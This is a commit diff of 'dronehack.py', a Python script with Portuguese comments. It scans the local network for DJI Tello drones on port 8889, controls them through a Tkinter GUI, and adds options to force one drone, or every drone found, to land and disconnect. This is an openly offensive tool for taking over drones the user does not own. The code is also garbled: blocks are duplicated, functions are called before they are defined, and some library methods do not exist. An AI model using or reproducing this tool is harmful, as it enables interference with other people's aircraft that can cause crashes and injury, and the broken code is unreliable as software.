873bd250a67b96e82d45535a81771a2750868876
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-07-06 16:16:22 -0300

    dronehack.py

--- dronehack.py
+++ dronehack.py
@@ -1,9 +1,12 @@
+import tkinter as tk
+from PIL import ImageTk, Image
+from threading import Thread
+from time import sleep
+from djitellopy import Tello
 import importlib
 import netifaces
 import socket
 import os
-from threading import Thread
-from time import sleep
 
 def ascii():
     print("""                                      .:-======-:.                                                                    
@@ -31,6 +34,74 @@ def ascii():
                                                                     =@.-%@=                                                       
                                                                     :@@#-                                                         
                                                                      :.                                       """)
+
+
+# (Controle do Drone)
+
+# Inicializar o drone
+drone = Tello()
+
+# Função para capturar o feed de vídeo do drone
+def capture_video():
+    while True:
+        frame = drone.get_frame_read().frame
+        image = Image.fromarray(frame)
+        photo = ImageTk.PhotoImage(image)
+        label.config(image=photo)
+        label.image = photo
+        sleep(0.01)
+
+# Funções para controlar o drone
+def takeoff():
+    drone.takeoff()
+
+def land():
+    drone.land()
+
+def move_forward():
+    drone.move_forward(50)
+
+def move_backward():
+    drone.move_backward(50)
+
+def move_left():
+    drone.move_left(50)
+
+def move_right():
+    drone.move_right(50)
+
+# Criar janela
+window = tk.Tk()
+
+# Criar rótulo para exibir a imagem do vídeo
+label = tk.Label(window)
+label.pack()
+
+# Criar botões de controle
+takeoff_button = tk.Button(window, text="Decolar", command=takeoff)
+takeoff_button.pack()
+
+land_button = tk.Button(window, text="Pousar", command=land)
+land_button.pack()
+
+forward_button = tk.Button(window, text="Avançar", command=move_forward)
+forward_button.pack()
+
+backward_button = tk.Button(window, text="Recuar", command=move_backward)
+backward_button.pack()
+
+left_button = tk.Button(window, text="Esquerda", command=move_left)
+left_button.pack()
+
+right_button = tk.Button(window, text="Direita", command=move_right)
+right_button.pack()
+
+# Iniciar captura de vídeo em uma thread separada
+video_thread = Thread(target=capture_video)
+video_thread.daemon = True
+video_thread.start()
+
+# (Conexão e controle do drone)
 
 # Verifica se a biblioteca djitellopy está instalada
 try:
@@ -125,6 +196,192 @@ def video_handler(event, sender, data):
 def send_command(command):
     drone.send_command(command)
 
+# Função para tirar uma foto e salvá-la em arquivo local
+def take_photo():
+    photo = drone.take_picture()
+    photo.save("photo.jpg")
+    print("Foto tirada e salva em 'photo.jpg'")
+
+# Função para fazer uma gravação e salvar em arquivo local
+def start_recording():
+    drone.start_recording()
+    print("Iniciando gravação")
+
+def stop_recording():
+    drone.stop_recording()
+    print("Gravação encerrada")
+
+# Desconectar o drone
+def disconnect_drone(drone):
+    drone.disconnect()
+
+# Desconectar todos os drones
+def disconnect_all_drones(drones):
+    for drone in drones:
+        drone.disconnect()
+
+# Conectar ao drone
+drone_ip = choose_drone_ip()
+drone_port = get_drone_port()
+drone = Tello(drone_ip, drone_port)
+drone.connect()
+
+# Configurar manipuladores de eventos
+drone.subscribe(drone.EVENT_FLIGHT_DATA, state_handler)
+drone.subscribe(drone.EVENT_VIDEO_FRAME, video_handler)
+
+# Iniciar stream de vídeo
+drone.streamon()
+
+# Criar janela
+window = tk.Tk()
+
+# Criar rótulo para exibir a imagem do vídeo
+label = tk.Label(window)
+label.pack()
+
+# Criar botões de controle
+takeoff_button = tk.Button(window, text="Decolar", command=takeoff)
+takeoff_button.pack()
+
+land_button = tk.Button(window, text="Pousar", command=land)
+land_button.pack()
+
+forward_button = tk.Button(window, text="Avançar", command=move_forward)
+forward_button.pack()
+
+backward_button = tk.Button(window, text="Recuar", command=move_backward)
+backward_button.pack()
+
+left_button = tk.Button(window, text="Esquerda", command=move_left)
+left_button.pack()
+
+right_button = tk.Button(window, text="Direita", command=move_right)
+right_button.pack()
+
+photo_button = tk.Button(window, text="Tirar Foto", command=take_photo)
+photo_button.pack()
+
+start_rec_button = tk.Button(window, text="Iniciar Gravação", command=start_recording)
+start_rec_button.pack()
+
+stop_rec_button = tk.Button(window, text="Parar Gravação", command=stop_recording)
+stop_rec_button.pack()
+
+# Iniciar captura de vídeo em uma thread separada
+video_thread = Thread(target=capture_video)
+video_thread.daemon = True
+video_thread.start()
+
+# Funções do segundo código (Conexão e controle do drone)
+
+# Verifica se a biblioteca djitellopy está instalada
+try:
+    importlib.import_module('djitellopy')
+    print("Biblioteca djitellopy já está instalada.")
+except ImportError:
+    print("Biblioteca djitellopy não encontrada. Baixando do repositório...")
+    try:
+        os.system("git clone https://github.com/damiafuentes/DJITelloPy.git")
+        print("Biblioteca djitellopy baixada com sucesso.")
+    except Exception as e:
+        print("Ocorreu um erro durante o download da biblioteca djitellopy:")
+        print(str(e))
+        exit()
+
+# Importa a biblioteca djitellopy
+from djitellopy import Tello
+
+# Obtém o endereço IP da interface de rede
+def get_local_ip():
+    interfaces = netifaces.interfaces()
+    for interface in interfaces:
+        if interface != 'lo':
+            addresses = netifaces.ifaddresses(interface)
+            if netifaces.AF_INET in addresses:
+                ipv4_addresses = addresses[netifaces.AF_INET]
+                if len(ipv4_addresses) > 0:
+                    return ipv4_addresses[0]['addr']
+    return None
+
+# Lista os IPs disponíveis na rede local
+def list_available_ips():
+    local_ip = get_local_ip()
+    if local_ip:
+        prefix = ".".join(local_ip.split(".")[:-1])
+        available_ips = []
+        for i in range(1, 255):
+            ip = f"{prefix}.{i}"
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1)
+            result = sock.connect_ex((ip, 8889))  # Porta do protocolo Tello
+            if result == 0:
+                available_ips.append(ip)
+            sock.close()
+        return available_ips
+    return []
+
+# Lista os IPs disponíveis e permite selecionar o IP do drone
+def choose_drone_ip():
+    ips = list_available_ips()
+    if ips:
+        print("IPs disponíveis:")
+        for i, ip in enumerate(ips):
+            print(f"{i+1}. {ip}")
+
+        while True:
+            try:
+                choice = int(input("Selecione o número do IP do drone: "))
+                if 1 <= choice <= len(ips):
+                    return ips[choice - 1]
+                else:
+                    print("Escolha inválida. Tente novamente.")
+            except ValueError:
+                print("Entrada inválida. Digite um número.")
+    else:
+        print("Nenhum IP de drone encontrado.")
+        return None
+# Função para obter a porta para conexão
+def get_drone_port():
+    default_port = 8889
+    user_input = input(f"Digite a porta do drone (padrão {default_port}) ou deixe em branco para descoberta automática: ")
+    if user_input == "":
+        return default_port
+    try:
+        port = int(user_input)
+        return port
+    except ValueError:
+        print("Entrada inválida. Usando a porta padrão.")
+        return default_port
+
+# Função para receber os dados do estado do drone
+def state_handler(event, sender, data):
+    print(f"[Estado do Drone] {data}")
+
+# Função para receber os dados de vídeo do drone
+def video_handler(event, sender, data):
+    # Processar o feed de vídeo aqui
+    pass
+
+# Função para enviar comandos ao drone
+def send_command(command):
+    drone.send_command(command)
+
+# Função para tirar uma foto e salvá-la em arquivo local
+def take_photo():
+    photo = drone.take_picture()
+    photo.save("photo.jpg")
+    print("Foto tirada e salva em 'photo.jpg'")
+
+# Função para fazer uma gravação e salvar em arquivo local
+def start_recording():
+    drone.start_recording()
+    print("Iniciando gravação")
+
+def stop_recording():
+    drone.stop_recording()
+    print("Gravação encerrada")
+
 # Desconectar o drone
 def disconnect_drone(drone):
     drone.disconnect()
@@ -151,7 +408,8 @@ drone.streamon()
 while True:
     ascii()
     print("\n1. Controlar o drone")
-    print("2. Derrubar o drone")
+    print("2. Derrubar um drone")
+    print("3. Derrubar todos os drones")
     print("0. Sair\n")
 
     choice = input("Digite o número da opção desejada: ")
@@ -205,10 +463,27 @@ while True:
 
         # Aguardar o encerramento da thread de processamento de comandos
         thread.join()
-        
+
     elif choice == "2":
-        disconnect_drone(drone)
-        print("Drone desconectado.")
+        drone_ip = input("Digite o IP do drone que deseja derrubar: ")
+        drone_port = get_drone_port()
+        drone_to_drop = Tello(drone_ip, drone_port)
+        drone_to_drop.connect()
+        drone_to_drop.land()
+        disconnect_drone(drone_to_drop)
+        print("Drone derrubado.")
+
+    elif choice == "3":
+        available_ips = list_available_ips()
+        if available_ips:
+            for ip in available_ips:
+                drone_to_drop = Tello(ip, get_drone_port())
+                drone_to_drop.connect()
+                drone_to_drop.land()
+                disconnect_drone(drone_to_drop)
+            print("Todos os drones foram derrubados.")
+        else:
+            print("Nenhum drone encontrado.")
 
     elif choice == "0":
         disconnect_all_drones([drone])
@@ -217,3 +492,4 @@ while True:
 
     else:
         print("Escolha inválida. Tente novamente.")
+
